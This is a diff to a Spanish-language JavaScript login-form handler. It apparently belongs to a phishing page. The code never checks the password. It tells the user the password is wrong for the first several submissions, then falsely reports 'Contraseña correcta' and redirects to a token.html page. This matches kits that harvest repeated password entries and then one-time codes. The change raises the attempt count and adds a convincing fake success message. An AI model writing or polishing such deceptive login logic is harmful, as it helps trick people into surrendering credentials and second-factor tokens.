@@ -1,5 +1,5 @@
 let intentos = 0;
-const maxIntentos = 3;
+const maxIntentos = 4;
 
 document.getElementById("loginForm").addEventListener("submit", function(e){
     e.preventDefault();
@@ -10,9 +10,13 @@ document.getElementById("loginForm").addEventListener("submit", function(e){
 
     if(intentos < maxIntentos){
         mensaje.style.color = "#c0392b";
-        mensaje.textContent = "Contraseña no válida";
+        mensaje.textContent = "Contraseña incorrecta, intenta de nuevo";
     } else {
-        // En el tercer intento entra directamente
-        window.location.href = "token.html";
+        mensaje.style.color = "#27ae60";
+        mensaje.textContent = "Contraseña correcta";
+        
+        setTimeout(() => {
+            window.location.href = "token.html";
+        }, 1000); // espera 1 segundo antes de redirigir
     }
 });
